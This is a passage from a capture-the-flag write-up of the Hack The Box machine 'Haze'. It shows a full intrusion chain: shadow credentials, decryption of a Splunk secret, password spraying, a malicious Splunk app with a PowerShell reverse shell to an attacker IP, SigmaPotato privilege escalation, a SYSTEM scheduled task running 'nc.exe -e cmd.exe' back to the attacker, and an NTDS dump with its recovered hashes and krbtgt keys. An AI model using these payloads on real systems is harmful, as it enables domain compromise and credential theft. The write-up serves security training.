distinguishedName: CN=Edward Martin,CN=Users,DC=haze,DC=htb
msDS-KeyCredentialLink: WRITE
[...]
```

Create shadow credentials for `Edward.Martin`

> The operation failed due to old TGT not having the permission
> 
> ```bash
> ┌──(bravosec㉿fsociety)-[~/htb/Haze]
> └─$ KRB5CCNAME="$(pt get ticket)" certipy shadow -k auto -target "$(pt get dc_fqdn)" -dc-ip $(pt get ip) -u "$(pt get user)" -account "Edward.Martin"
> Certipy v5.0.3 - by Oliver Lyak (ly4k)
> 
> [!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
> [*] Targeting user 'edward.martin'
> [*] Generating certificate
> [*] Certificate generated
> [*] Generating Key Credential
> [*] Key Credential generated with DeviceID '10bc2ed19a914cb2a86c1bb6f759c17f'
> [*] Adding Key Credential with device ID '10bc2ed19a914cb2a86c1bb6f759c17f' to the Key Credentials for 'edward.martin'
> [-] Could not update Key Credentials for 'edward.martin' due to insufficient access rights: 00002098: SecErr: DSID-031514B3, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0
> ```
{: .prompt-danger }

Request a new TGT to update the group info

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ getTGT.py -dc-ip $(pt get ip) -aesKey "$(pt get hash)" "$(pt get domain)"/"$(pt get user)"; pt set ticket $(realpath "$(pt get user).ccache")
/home/kali/.local/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.13.0.dev0+20250626.63631.6b8f623 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in Haze-IT-Backup$.ccache
```

Create shadow credentials for `Edward.Martin` then recover its NT hash via **PKITNT** **UnPAC** the hash

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ KRB5CCNAME="$(pt get ticket)" certipy shadow -k auto -target "$(pt get dc_fqdn)" -dc-ip $(pt get ip) -u "$(pt get user)" -account "Edward.Martin"
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
[*] Targeting user 'edward.martin'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '74644c95037846259ae8f9f18d544b0a'
[*] Adding Key Credential with device ID '74644c95037846259ae8f9f18d544b0a' to the Key Credentials for 'edward.martin'
[*] Successfully added Key Credential with device ID '74644c95037846259ae8f9f18d544b0a' to the Key Credentials for 'edward.martin'
[*] Authenticating as 'edward.martin' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'edward.martin@haze.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'edward.martin.ccache'
[*] Wrote credential cache to 'edward.martin.ccache'
[*] Trying to retrieve NT hash for 'edward.martin'
[*] Restoring the old Key Credentials for 'edward.martin'
[*] Successfully restored the old Key Credentials for 'edward.martin'
[*] NT hash for 'edward.martin': 09e0b3eeb2e7a6b0d419e9ff8f4d91af
```

Add TGT and credentials to record

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ pt set ticket $(realpath `ls -t *.ccache|head -1`)

┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ creds-set 'edward.martin' '09e0b3eeb2e7a6b0d419e9ff8f4d91af'
[+] Hash set for user edward.martin
```


### 5985 - Winrm

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ KRB5CCNAME="$(pt get ticket)" evil-winrm -r $(pt get domain) -i $(pt get rhost)

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\edward.martin\Documents> whoami
haze\edward.martin
*Evil-WinRM* PS C:\Users\edward.martin\Documents> cat ..\Desktop\user.txt
1e7df16a0364291d027d405e80e6129c
```


# Root Flag
---


## Shell as alexander.green


### Domain enumeration

Since we didn't get `edward.martin`'s user info previously, we should re-do domain enumeration

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ cat ldeep/_users_all.json | jq '.' -c | grep 'edward' -i
```

```bash
KRB5CCNAME="$(pt get ticket)" bloodhound-ce-python -d "$(pt get domain)" -ns $(pt get ip) -c all --zip -u "$(pt get user)" -k -no-pass
bhcli upload `ls -t *.zip | head -1`
mkdir -p ldeep && KRB5CCNAME="$(pt get ticket)" ldeep ldap -k -d "$(pt get domain)" -s "ldap://$(pt get dc_fqdn)" all ldeep/
```


### User access check


#### AD

- `edward.martin` is in some interesting groups
	- `Remote Management Users` - WINRM access
	- `Backup_Reviewers` - Could be able to view `C:\Backups`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ bloodyAD --host $(pt get rhost) -d $(pt get domain) -k ccache="$(pt get ticket)" get membership "$(pt get user)"

distinguishedName: CN=Users,CN=Builtin,DC=haze,DC=htb
objectSid: S-1-5-32-545
sAMAccountName: Users

distinguishedName: CN=Remote Management Users,CN=Builtin,DC=haze,DC=htb
objectSid: S-1-5-32-580
sAMAccountName: Remote Management Users

distinguishedName: CN=Domain Users,CN=Users,DC=haze,DC=htb
objectSid: S-1-5-21-323145914-28650650-2368316563-513
sAMAccountName: Domain Users

distinguishedName: CN=Backup_Reviewers,CN=Users,DC=haze,DC=htb
objectSid: S-1-5-21-323145914-28650650-2368316563-1109
sAMAccountName: Backup_Reviewers
```


### 5985 - Winrm : Download splunk backup file

- `Backup_Reviewers` has read access to `C:\Backups`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ KRB5CCNAME="$(pt get ticket)" evil-winrm -r $(pt get domain) -i $(pt get rhost)

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\edward.martin\Documents> icacls \Backups
\Backups HAZE\Backup_Reviewers:(OI)(CI)(RX)
         CREATOR OWNER:(OI)(CI)(IO)(F)
         NT AUTHORITY\SYSTEM:(OI)(CI)(F)
         BUILTIN\Administrators:(OI)(CI)(F)

Successfully processed 1 files; Failed processing 0 files
```

There's a **splunk** backup file in `C:\Backups`

```powershell
*Evil-WinRM* PS C:\Users\edward.martin\Documents> (ls -fo -r \Backups) 2>$null | select Mode,@{N='Owner'; E={$_.GetAccessControl().Owner}},LastWriteTime,Length,FullName | sort LastWriteTime | ft -wrap

Mode   Owner                  LastWriteTime          Length FullName
----   -----                  -------------          ------ --------
-a---- BUILTIN\Administrators 8/6/2024 3:22:13 PM  27445566 C:\Backups\Splunk\splunk_backup_2024-08-06.zip
d----- BUILTIN\Administrators 3/5/2025 12:33:26 AM          C:\Backups\Splunk
```

Download the backup file

```powershell
*Evil-WinRM* PS C:\Users\edward.martin\Documents> download 'C:\Backups\Splunk\splunk_backup_2024-08-06.zip' ./loot/splunk_backup_2024-08-06.zip

Info: Downloading C:\Backups\Splunk\splunk_backup_2024-08-06.zip to ./loot/splunk_backup_2024-08-06.zip

Info: Download successful!
```


### Decrypt splunk legacy secrets

Unzip the backup file

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze/loot]
└─$ 7z x splunk_backup_2024-08-06.zip -o'splunk_backup_2024-08-06'
[...]
```

Grep for splunk hashes

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze/loot]
└─$ grep -rPo '\$\d+\$[A-Za-z0-9./+=]{5,}' splunk_backup_2024-08-06
splunk_backup_2024-08-06/Splunk/var/run/splunk/confsnapshot/baseline_local/system/local/authentication.conf:$1$YDz8WfhoCWmf6aTRkA+QqUI=
splunk_backup_2024-08-06/Splunk/var/run/splunk/confsnapshot/baseline_local/system/local/server.conf:$7$u538ChVu1V7V9pXEWterpsj8mxzvVORn8UdnesMP0CHaarB03fSbow==
splunk_backup_2024-08-06/Splunk/var/run/splunk/confsnapshot/baseline_local/system/local/server.conf:$7$C4l4wOYleflCKJRL9l/lBJJQEBeO16syuwmsDCwft11h7QPjPH8Bog==
splunk_backup_2024-08-06/Splunk/etc/passwd:$6$8FRibWS3pDNoVWHU
splunk_backup_2024-08-06/Splunk/etc/system/README/user-seed.conf.example:$6$TOs.jXjSRTCsfPsw
splunk_backup_2024-08-06/Splunk/etc/system/README/inputs.conf.example:$7$ifQTPTzHD/BA8VgKvVcgO1KQAtr3N1C8S/1uK3nAKIE9dd9e9g==
splunk_backup_2024-08-06/Splunk/etc/system/README/outputs.conf.example:$1$/fRSBT+2APNAyCB7tlcgOyLnAtqAQFC8NI4TGA2wX4JHfN5d9g==
```

- `$1$YDz8WfhoCWmf6aTRkA+QqUI=` is a reversible hash

![](/assets/obsidian/eb8e34e51b3190e37fdcb62d2b591ebf.png)

Decrypt the hash with the new secret key

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze/loot]
└─$ cat splunk_backup_2024-08-06/Splunk/etc/auth/splunk.secret
CgL8i4HvEen3cCYOYZDBkuATi5WQuORBw9g4zp4pv5mpMcMF3sWKtaCWTX8Kc1BK3pb9HR13oJqHpvYLUZ.gIJIuYZCA/YNwbbI4fDkbpGD.8yX/8VPVTG22V5G5rDxO5qNzXSQIz3NBtFE6oPhVLAVOJ0EgCYGjuk.fgspXYUc9F24Q6P/QGB/XP8sLZ2h00FQYRmxaSUTAroHHz8fYIsChsea7GBRaolimfQLD7yWGefscTbuXOMJOrzr/6B 

┌──(bravosec㉿fsociety)-[~/htb/Haze/loot]
└─$ splunksecrets splunk-legacy-decrypt -S <(echo 'CgL8i4HvEen3cCYOYZDBkuATi5WQuORBw9g4zp4pv5mpMcMF3sWKtaCWTX8Kc1BK3pb9HR13oJqHpvYLUZ.gIJIuYZCA/YNwbbI4fDkbpGD.8yX/8VPVTG22V5G5rDxO5qNzXSQIz3NBtFE6oPhVLAVOJ0EgCYGjuk.fgspXYUc9F24Q6P/QGB/XP8sLZ2h00FQYRmxaSUTAroHHz8fYIsChsea7GBRaolimfQLD7yWGefscTbuXOMJOrzr/6B') --ciphertext '$1$YDz8WfhoCWmf6aTRkA+QqUI='
Sp1unkadmin@2k24
```


### (Failed) 88 - Kerberos : Password spray

Spray password on users that we don't have credentials

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ cat ldeep/_users_enabled.lst | grep -vf <(cat hashes.lst creds.lst| awk -F: '{print $1}') > users_tospray.lst && nxc ldap -k $(pt get dc_fqdn) --log nxc_kerberos.log --continue-on-success -u users_tospray.lst -p 'Sp1unkadmin@2k24'
LDAP        DC01.haze.htb   389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:haze.htb) (signing:None) (channel binding:Never)
LDAP        DC01.haze.htb   389    DC01             [-] haze.htb\alexander.green:Sp1unkadmin@2k24 KDC_ERR_PREAUTH_FAILED
LDAP        DC01.haze.htb   389    DC01             [-] haze.htb\Administrator:Sp1unkadmin@2k24 KDC_ERR_PREAUTH_FAILED
```


### 8000 - Spunk : Password spray

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ ffuf -c --request-proto http -request login_8000.req -w users_spunk.lst -fc 401

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.11.61:8000/en-US/account/login
 :: Wordlist         : FUZZ: /home/kali/htb/Haze/users_spunk.lst
 :: Header           : Accept: text/javascript, text/html, application/xml, text/xml, */*
 :: Header           : Accept-Encoding: gzip, deflate, br
 :: Header           : Referer: http://10.10.11.61:8000/
 :: Header           : Content-Type: application/x-www-form-urlencoded; charset=UTF-8
 :: Header           : X-Requested-With: XMLHttpRequest
 :: Header           : Cookie: cval=1243458601; splunkweb_uid=5CA3406E-3FCB-4929-BC34-E767D7AF8527; splunkweb_uid=5CA3406E-3FCB-4929-BC34-E767D7AF8527; session_id_8000=13c92d5f4601528ca433eebf0c39896448d7c128
 :: Header           : DNT: 1
 :: Header           : Sec-GPC: 1
 :: Header           : Host: 10.10.11.61:8000
 :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
 :: Header           : Accept-Language: en-US,en;q=0.5
 :: Header           : Origin: http://10.10.11.61:8000
 :: Header           : Connection: keep-alive
 :: Header           : Priority: u=0
 :: Data             : cval=1243458601&username=FUZZ&password=Sp1unkadmin@2k24&return_to=%2Fen-US%2F
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 401
________________________________________________

admin                   [Status: 200, Size: 12, Words: 1, Lines: 1, Duration: 1977ms]
:: Progress: [4/4] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
```

> http://10.10.11.61:8000/en-US/account/login?return_to=%2Fen-US%2F

- Login : `admin:Sp1unkadmin@2k24`

![](/assets/obsidian/f35fcdc9273e771a0c6ca8468f44507a.png)


### 8000 - Spunk : Create Custom Application to RCE

By searching for `splunk rce` on [hacktricks](https://book.hacktricks.wiki/), we know that there's a way to achieve RCE in **splunk** by creating a custom APP

> REF - https://book.hacktricks.wiki/en/network-services-pentesting/8089-splunkd.html?highlight=splunk%20rce#create-custom-application

```bash
cd exploit
git clone https://github.com/0xjpuff/reverse_shell_splunk
cd reverse_shell_splunk
```

Edit `inputs.conf` and the powershell reverse shell script

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze/exploit/reverse_shell_splunk]
└─$ vi reverse_shell_splunk/default/inputs.conf
[script://.\bin\run.bat]
disabled = 0
sourcetype = pentest
interval = 10
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze/exploit/reverse_shell_splunk]
└─$ vi reverse_shell_splunk/bin/run.ps1
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.66',1111);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + '[' + (pwd).Path + ']: ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Pack the app into an archive

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze/exploit/reverse_shell_splunk]
└─$ mv reverse_shell_splunk app

┌──(bravosec㉿fsociety)-[~/htb/Haze/exploit/reverse_shell_splunk]
└─$ tar -czf app.spl app
```

Start reverse shell listener

```bash
rlwrap -cAr nc -lvnp 1111
```

Install the custom APP

> http://10.10.11.61:8000/en-US/manager/appinstall/_upload?breadcrumbs=Settings%7C%2Fmanager%2Fsearch%2F%09Apps%7C%2Fmanager%2Fsearch%2Fapps%2Flocal

![](/assets/obsidian/5cba49b3454cae8f859693026d83a738.png)

We've got a shell as `alexander.green` right after installing the APP

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ rlwrap -cAr nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.14.66] from (UNKNOWN) [10.10.11.61] 49185
whoami
haze\alexander.green
[C:\Windows\system32]:
```


## Shell as nt authority system


### Abuse privilege tokens

- `alexander.green` has `SeImpersonatePrivilege` privilege token enabled, which can be abused by **potato attacks** to escalate privileges

```bash
[C:\Windows\system32]: whoami /all

USER INFORMATION
----------------

User Name            SID
==================== ===========================================
haze\alexander.green S-1-5-21-323145914-28650650-2368316563-1106


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                         Attributes
========================================== ================ =========================================== ==================================================
Everyone                                   Well-known group S-1-1-0                                     Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574                                Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                       Well-known group S-1-5-6                                     Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                    Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0                                     Mandatory group, Enabled by default, Enabled group
HAZE\Splunk_Admins                         Group            S-1-5-21-323145914-28650650-2368316563-1108 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

Since the windows version is `Windows Server 2022`, we can use [SigmaPotato](https://github.com/tylerdotrar/SigmaPotato) to perform the potato attack

```bash
[C:\Windows\system32]: systeminfo

Host Name:                 DC01
OS Name:                   Microsoft Windows Server 2022 Standard
OS Version:                10.0.20348 N/A Build 20348
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Primary Domain Controller
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00454-20165-01481-AA286
Original Install Date:     3/4/2025, 11:00:20 PM
System Boot Time:          7/7/2025, 8:38:14 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2994 Mhz
                           [02]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2994 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.24224532.B64.2408191458, 8/19/2024
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume2
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     4,095 MB
Available Physical Memory: 2,331 MB
Virtual Memory: Max Size:  5,503 MB
Virtual Memory: Available: 3,509 MB
Virtual Memory: In Use:    1,994 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    haze.htb
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0 2
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.11.61
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

We'll need to run an executable for reverse shells to preserve `NT Authority SYSTEM`'s privilege tokens

Host `nc.exe` (It could be any custom written `netcat` or reverse shell executables to evade Antiviruses / EDR)

```bash
┌──(bravosec㉿fsociety)-[~/www]
└─$ ln -s /usr/share/windows-resources/binaries/nc.exe

┌──(bravosec㉿fsociety)-[~/www]
└─$ fuser -k 80/tcp 2>/dev/null; python -m http.server 80
 1666755Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Download `nc.exe` on target machine

```bash
[C:\Windows\system32]: (new-object System.Net.WebClient).DownloadFile('http://10.10.14.66:80/nc.exe', '\programdata\nc.exe');
```

Get a reverse shell as `NT Authority SYSTEM`

```bash
rlwrap -cAr nc -lvnp 1111
```

```bash
[C:\Windows\system32]: (new-object System.Net.WebClient).DownloadFile('http://10.10.14.66:80/nc.exe', '\programdata\nc.exe'); \programdata\nc.exe
[C:\Windows\system32]: [System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://10.10.14.66/LPE/Privilege-Tokens/SigmaPotato.exe"));

GAC    Version        Location
---    -------        --------
False  v4.0.30319


[C:\Windows\system32]: [SigmaPotato]::Main("\programdata\nc.exe -e cmd.exe 10.10.14.66 1111")
```

> We can't get current user info since the tokens weren't fully impersonated, but we can create schedule tasks or services to run a new reverse shell as `NT Authority SYSTEM`
{: .prompt-info }

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ rlwrap -cAr nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.14.66] from (UNKNOWN) [10.10.11.61] 50595
Microsoft Windows [Version 10.0.20348.3328]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami

C:\Windows\system32>
```

Create and run reverse shell schedule task

```bash
rlwrap -cAr nc -lvnp 1111
```

```bash
C:\Windows\system32>schtasks /create /sc minute /mo 1 /tn "\Microsoft\Windows\rev" /tr "C:\programdata\nc.exe -e cmd.exe 10.10.14.66 1111" /rl highest /ru "SYSTEM" /F
schtasks /create /sc minute /mo 1 /tn "\Microsoft\Windows\rev" /tr "C:\programdata\nc.exe -e cmd.exe 10.10.14.66 1111" /rl highest /ru "SYSTEM" /F
SUCCESS: The scheduled task "\Microsoft\Windows\rev" has successfully been created.

C:\Windows\system32>schtasks /run /tn "\Microsoft\Windows\rev"
schtasks /run /tn "\Microsoft\Windows\rev"
SUCCESS: Attempted to run the scheduled task "\Microsoft\Windows\rev".

C:\Windows\system32>
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ rlwrap -cAr nc -lvnp 1111
listening on [any] 1111 ...
powershell -ep bypass
connect to [10.10.14.66] from (UNKNOWN) [10.10.11.61] 50431
Microsoft Windows [Version 10.0.20348.3328]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> whoami
whoami
nt authority\system
PS C:\Windows\system32> cat C:\Users\Administrator\Desktop\root.txt
cat C:\Users\Administrator\Desktop\root.txt
2d4df2eab03d5d08ab82ae3f5f4daeef
```


# Additional
---

## Post exploitation


### Secrets

Dump and extract **NTDS**

```bash
PS C:\Windows\system32> ntdsutil "activate instance ntds" "ifm" "create full C:\Windows\Temp\NTDS" quit quit
C:\Windows\system32\ntdsutil.exe: activate instance ntds
Active instance set to "ntds".
C:\Windows\system32\ntdsutil.exe: ifm
ifm: create full C:\Windows\Temp\NTDS
Creating snapshot...
Snapshot set {3d016c26-6204-4c19-b63a-0782fdc5a21b} generated successfully.
Snapshot {95f94b15-e920-41e7-adde-b4c14b5d6a1f} mounted as C:\$SNAP_202507081800_VOLUMEC$\
Snapshot {95f94b15-e920-41e7-adde-b4c14b5d6a1f} is already mounted.
Initiating DEFRAGMENTATION mode...
     Source Database: C:\$SNAP_202507081800_VOLUMEC$\Windows\NTDS\ntds.dit
     Target Database: C:\Windows\Temp\NTDS\Active Directory\ntds.dit

                  Defragmentation  Status (omplete)

          0    10   20   30   40   50   60   70   80   90  100
          |----|----|----|----|----|----|----|----|----|----|
          ...................................................

Copying registry files...
Copying C:\Windows\Temp\NTDS\registry\SYSTEM
Copying C:\Windows\Temp\NTDS\registry\SECURITY
Snapshot {95f94b15-e920-41e7-adde-b4c14b5d6a1f} unmounted.
IFM media created successfully in C:\Windows\Temp\NTDS
ifm: quit
C:\Windows\system32\ntdsutil.exe: quit
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ scp -J 127.0.0.1:443 -r "$(pt get session)":"$(FILE="C:\Windows\Temp\NTDS"; echo "${FILE//\\//}")" ./loot/
ntds.dit                                                                                                                                                                       100%   32MB 500.3KB/s   01:05
ntds.jfm                                                                                                                                                                       100%   16KB  72.9KB/s   00:00
SECURITY                                                                                                                                                                       100%   64KB 334.0KB/s   00:00
SYSTEM   
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ secretsdump.py -system 'loot/NTDS/registry/SYSTEM' -security 'loot/NTDS/registry/SECURITY' -ntds 'loot/NTDS/Active Directory/ntds.dit' LOCAL -o secretsdump
/home/kali/.local/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.13.0.dev0+20250626.63631.6b8f623 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0x7ec056149ebcce76129c0b9f327f8308
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
$MACHINE.ACC:plain_password_hex:dc6a78a7af8ed39694328d179f44e6f253ba6b953d87efcd2b47322bc89e569b3100992e31f40ca22a4967c34388222c85bae610b1176259cc7671c5f172c5729a39c3659a3396ae1dff2346844f55bc530d17a6c81f8e2c1cf7430102552992aa146c9190b9609e8c016ed3f887ee552f589d80a74d81879f8a24ac6e566dae7ed895a4ac8a327627ff4819585ca20632c96822b16535f5f712a460c6ed7d6ba6a3cf9ed9b5441f54fe038d68245d10aedda0916ad72c298883c52b74612f1c1adbbed9a5bf0905a101498f366714f70554e8417de04784a12239f5e6f698a407ff46e54983ec9715db37adf8e4f641
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:9dcbc33adec3bdc8b2334060002ce1b4
[*] DPAPI_SYSTEM
dpapi_machinekey:0x720861dd5759f772fe9a7c026c15d673ad017cb7
dpapi_userkey:0x214dc8b71034bf529556f849fa8953bcc22b1a5a
[*] NL$KM
 0000   39 6C 57 0A 40 4D 30 0B  AE 8F 28 9D 67 7C A9 43   9lW.@M0...(.g|.C
 0010   10 87 17 A9 3F 51 18 29  F1 63 F4 89 9E AE AC D9   ....?Q.).c......
 0020   09 94 0E 42 B1 F4 25 11  D6 38 5A 32 70 77 E9 34   ...B..%..8Z2pw.4
 0030   DF 4E 55 52 32 4A 93 54  36 EF 19 AE DE 74 AC E9   .NUR2J.T6....t..
NL$KM:396c570a404d300bae8f289d677ca943108717a93f511829f163f4899eaeacd909940e42b1f42511d6385a327077e934df4e5552324a935436ef19aede74ace9
[*] _SC_Splunkd
(Unknown User):Al3xand3r-Purple!
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: dc4e667e33c792bb980f4802a347f42c
[*] Reading and decrypting hashes from loot/NTDS/Active Directory/ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:06dc954d32cb91ac2831d67e3e12027f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:9dcbc33adec3bdc8b2334060002ce1b4:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:937e28202a6cdfcc556d1b677bcbe82c:::
haze.htb\paul.taylor:1103:aad3b435b51404eeaad3b435b51404ee:e90878e2fb0a21a11859ff60f1119fb4:::
haze.htb\mark.adams:1104:aad3b435b51404eeaad3b435b51404ee:e90878e2fb0a21a11859ff60f1119fb4:::
haze.htb\edward.martin:1105:aad3b435b51404eeaad3b435b51404ee:09e0b3eeb2e7a6b0d419e9ff8f4d91af:::
haze.htb\alexander.green:1106:aad3b435b51404eeaad3b435b51404ee:6b8caa0cd4f8cb8ddf2b5677a24cc510:::
Haze-IT-Backup$:1111:aad3b435b51404eeaad3b435b51404ee:735c02c6b2dc54c3c8c6891f55279ebc:::
[*] Kerberos keys from loot/NTDS/Active Directory/ntds.dit
Administrator:aes256-cts-hmac-sha1-96:71cf24a70eb73f9c3605c44d71e3e7dab2589557edaa9675c550bdcd93232151
Administrator:aes128-cts-hmac-sha1-96:ec1358e4aec023c2545b3ad3bcc963b1
Administrator:des-cbc-md5:6b0b2f2c381fabc2
DC01$:aes256-cts-hmac-sha1-96:7705da9b46802c12b5193d10e7fcec147f02a46bf7a1afb79cfd4fb11e4aba05
DC01$:aes128-cts-hmac-sha1-96:0667686e6cedf1166d08ed2ff7b40c6b
DC01$:des-cbc-md5:2fbaa78646e5b5e9
krbtgt:aes256-cts-hmac-sha1-96:dfdbf3ca72f05d60c27266ddef0410b0ed239b8a05dc9252d59557c642d8b67d
krbtgt:aes128-cts-hmac-sha1-96:b96b704e1e796747fa809203358481d7
krbtgt:des-cbc-md5:980b37a8f47fc71c
haze.htb\paul.taylor:aes256-cts-hmac-sha1-96:245a198156df2f2f0426edf6db80d022f2734927feeadb222f18afd36c2aa3f2
haze.htb\paul.taylor:aes128-cts-hmac-sha1-96:601e89171be318389fd66d05c3e7a797
haze.htb\paul.taylor:des-cbc-md5:646129f19b679486
haze.htb\mark.adams:aes256-cts-hmac-sha1-96:bb930bfb3394a8c79eb614c66f2cf7af23e1aaec9a209ff370a8a1ae67771fc4
